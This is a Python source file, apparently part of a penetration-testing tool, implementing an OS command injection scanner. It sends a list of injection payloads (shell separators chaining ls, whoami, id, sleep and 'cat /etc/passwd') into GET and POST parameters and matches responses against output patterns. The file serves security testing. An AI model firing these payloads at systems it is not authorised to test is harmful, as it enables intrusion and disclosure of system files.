"""
Command Injection detection scanner
"""
import asyncio
import logging
import time
from typing import List, Optional
from app.models import Vulnerability, SeverityLevel, VulnerabilityCategory
from app.utils import PentestHTTPClient

logger = logging.getLogger(__name__)

class CommandInjectionScanner:
    """Detect OS command injection vulnerabilities"""

    # Command injection payloads
    PAYLOADS = [
        # Linux/Unix
        "; ls",
        "| ls",
        "& ls",
        "&& ls",
        "|| ls",
        "`ls`",
        "$(ls)",
        "; whoami",
        "| whoami",
        "&& whoami",
        "; id",
        "| id",

        # Time-based detection
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "` sleep 5 `",
        "$( sleep 5 )",

        # Windows
        "& dir",
        "| dir",
        "&& dir",
        "& whoami",
        "| whoami",
        "&& whoami",

        # With command separators
        "\n whoami",
        "\r\n whoami",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
    ]

    # Command output patterns
    COMMAND_PATTERNS = [
        # Linux commands
        r"total \d+",  # ls -l output
        r"uid=\d+",  # id command
        r"root:x:0:0",  # /etc/passwd
        r"bin.*bash",  # /etc/passwd
        r"nobody:x:",  # /etc/passwd

        # Windows commands
        r"Volume in drive",
        r"Directory of",
        r"<DIR>",

        # Whoami output
        r"[a-z0-9_-]+\\[a-z0-9_-]+",  # Windows: DOMAIN\user
    ]

    def __init__(self, client: PentestHTTPClient, scan_depth: str = "balanced", progress_callback=None):
        self.client = client
        self.scan_depth = scan_depth
        self.progress_callback = progress_callback

        # Adjust payload limits based on scan depth
        if scan_depth == "quick":
            self.payload_limit = 8  # Quick but reasonable coverage
            self.skip_time_based = True  # Skip sleep payloads (saves 5s+ per test)
        elif scan_depth == "balanced":
            self.payload_limit = 18  # Good coverage
            self.skip_time_based = False
        else:  # deep
            self.payload_limit = len(self.PAYLOADS)  # All payloads
            self.skip_time_based = False

    async def scan(self, endpoints: List[str]) -> List[Vulnerability]:
        """Scan for command injection vulnerabilities"""
        vulnerabilities = []
        total_endpoints = len(endpoints)

        for idx, endpoint in enumerate(endpoints, 1):
            if self.progress_callback:
                await self.progress_callback(f"[RCE] Testing endpoint {idx}/{total_endpoints}: {endpoint[:60]}...")

            try:
                vulns = await self._test_endpoint(endpoint)
                vulnerabilities.extend(vulns)

                if vulns and self.progress_callback:
                    await self.progress_callback(f"[+] Found {len(vulns)} RCE on {endpoint[:60]}")
            except Exception as e:
                logger.error(f"Error testing endpoint {endpoint}: {e}")
                if self.progress_callback:
                    await self.progress_callback(f"[!] Error: {endpoint[:60]}: {str(e)[:50]}")

        return vulnerabilities

    async def _test_endpoint(self, endpoint: str) -> List[Vulnerability]:
        """Test an endpoint for command injection"""
        vulnerabilities = []

        # Test GET parameters
        if '?' in endpoint:
            vulns = await self._test_get_params(endpoint)
            vulnerabilities.extend(vulns)

        # Test POST parameters
        vulns = await self._test_post_params(endpoint)
        vulnerabilities.extend(vulns)

        return vulnerabilities

    async def _test_get_params(self, endpoint: str) -> List[Vulnerability]:
        """Test GET parameters for command injection"""
        vulnerabilities = []

        if '?' not in endpoint:
            return vulnerabilities

        base_url, query_string = endpoint.split('?', 1)
        params = {}

        for param in query_string.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                params[key] = value

        # Test each parameter
        for param_name, original_value in params.items():
            # Filter payloads based on scan depth
            payloads_to_test = self.PAYLOADS[:self.payload_limit]
            if self.skip_time_based:
                # Skip time-based payloads (sleep) in quick mode
                payloads_to_test = [p for p in payloads_to_test if 'sleep' not in p.lower()]

            for payload in payloads_to_test:
                test_params = params.copy()
                test_params[param_name] = original_value + payload

                vuln = await self._test_payload(
                    'GET',
                    base_url,
                    param_name,
                    payload,
                    params=test_params
                )
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        return vulnerabilities

    async def _test_post_params(self, endpoint: str) -> List[Vulnerability]:
        """Test POST parameters for command injection"""
        vulnerabilities = []

        test_params = {
            'cmd': 'test',
            'command': 'test',
            'exec': 'test',
            'execute': 'test',
            'ping': '127.0.0.1',
            'ip': '127.0.0.1',
            'host': 'localhost',
            'file': 'test.txt',
            'path': '/tmp/test',
        }

        for param_name, original_value in test_params.items():
            # Filter payloads based on scan depth
            payloads_to_test = self.PAYLOADS[:self.payload_limit]
            if self.skip_time_based:
                payloads_to_test = [p for p in payloads_to_test if 'sleep' not in p.lower()]

            for payload in payloads_to_test:
                data = test_params.copy()
                data[param_name] = original_value + payload

                vuln = await self._test_payload(
                    'POST',
                    endpoint,
                    param_name,
                    payload,
                    data=data
                )
                if vuln:
                    vulnerabilities.append(vuln)
                    break

        return vulnerabilities

    async def _test_payload(
        self,
        method: str,
        url: str,
        param_name: str,
        payload: str,
        **kwargs
    ) -> Optional[Vulnerability]:
        """Test a specific payload"""
        try:
            # Measure response time for time-based detection
            start_time = time.time()

            if method == 'GET':
                response = await self.client.get(url, **kwargs)
            else:
                response = await self.client.post(url, **kwargs)

            elapsed_time = time.time() - start_time

            if not response:
                return None

            # Check for command output in response
            import re
            for pattern in self.COMMAND_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return Vulnerability(
                        id=f"cmdi_{method.lower()}_{param_name}_{hash(url)}",
                        title="OS Command Injection",
                        description=f"Command injection vulnerability in {method} parameter '{param_name}'",
                        severity=SeverityLevel.CRITICAL,
                        category=VulnerabilityCategory.INJECTION,
                        affected_url=url,
                        affected_parameter=param_name,
                        proof_of_concept=f"The parameter '{param_name}' allows execution of OS commands. "
                                       f"Command output detected in the response.",
                        payload=payload,
                        remediation="Never pass user input directly to system commands. "
                                  "Use parameterized APIs instead of shell commands. "
                                  "Implement strict input validation with whitelisting. "
                                  "Run application with minimum required privileges.",
                        cwe_id="CWE-78",
                        owasp_category="A03:2021 – Injection",
                        references=[
                            "https://owasp.org/www-community/attacks/Command_Injection",
                            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
                        ]
                    )

            # Time-based detection (if sleep command)
            if 'sleep' in payload.lower() and elapsed_time >= 5:
                return Vulnerability(
                    id=f"cmdi_blind_{method.lower()}_{param_name}_{hash(url)}",
                    title="Blind OS Command Injection (Time-based)",
                    description=f"Blind command injection in {method} parameter '{param_name}'",
                    severity=SeverityLevel.CRITICAL,
                    category=VulnerabilityCategory.INJECTION,
                    affected_url=url,
                    affected_parameter=param_name,
                    proof_of_concept=f"The parameter '{param_name}' is vulnerable to blind command injection. "
                                   f"Time delay observed: {elapsed_time:.2f}s",
                    payload=payload,
                    remediation="Never pass user input directly to system commands. "
                              "Use parameterized APIs instead of shell commands. "
                              "Implement strict input validation with whitelisting.",
                    cwe_id="CWE-78",
                    owasp_category="A03:2021 – Injection",
                    references=[
                        "https://owasp.org/www-community/attacks/Command_Injection"
                    ]
                )

        except Exception as e:
            logger.debug(f"Error testing command injection: {e}")

        return None
